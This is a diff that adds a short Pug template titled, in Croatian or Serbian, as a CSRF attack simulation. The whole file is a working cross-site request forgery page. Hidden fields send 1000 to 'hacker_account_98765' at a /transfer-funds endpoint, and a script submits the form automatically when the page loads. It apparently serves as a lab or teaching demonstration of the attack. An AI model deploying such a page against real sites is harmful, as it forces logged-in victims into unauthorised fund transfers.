@@ -1,0 +1,18 @@
+doctype html
+html(lang="en")
+  head
+    meta(charset="UTF-8")
+    title CSRF napad
+  body
+    h1 Simuliranje CSRF napada
+    form#csrfForm(action="/transfer-funds" method="POST")
+      input(type="hidden" name="amount" value="1000")
+      input(type="hidden" name="account" value="hacker_account_98765")
+
+    script.
+      document.getElementById("csrfForm").submit();
+    
+    
+    
+    
+
